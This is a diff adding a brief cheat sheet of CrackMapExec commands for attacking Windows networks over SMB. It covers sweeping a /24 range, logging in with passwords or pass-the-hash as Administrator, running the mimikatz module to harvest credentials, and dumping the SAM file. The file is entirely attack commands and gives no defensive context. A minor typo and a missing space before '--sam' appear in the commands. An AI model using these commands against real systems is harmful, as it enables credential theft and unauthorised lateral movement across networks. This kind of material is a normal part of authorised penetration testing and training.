@@ -1,0 +1,17 @@
+CrackMapExec:
+
+To start the process:
+crackmapexec smb <IP range/24>
+
+Using username and password/hashes:
+crackmapexec smb <IP range/24> -u <uname> -p <password>
+
+Using a Hash:
+crackmapexec smb <IP rannge/24> -u Administrator -H <hash>
+
+
+Run using mimikatz:
+crackmapexec smb 192.168.1.1/24 -u Administrator -p Password1 -M mimikatz
+
+Dump SAM File:
+crackmapexec smb <ip> -u <uname> -p <password>--sam
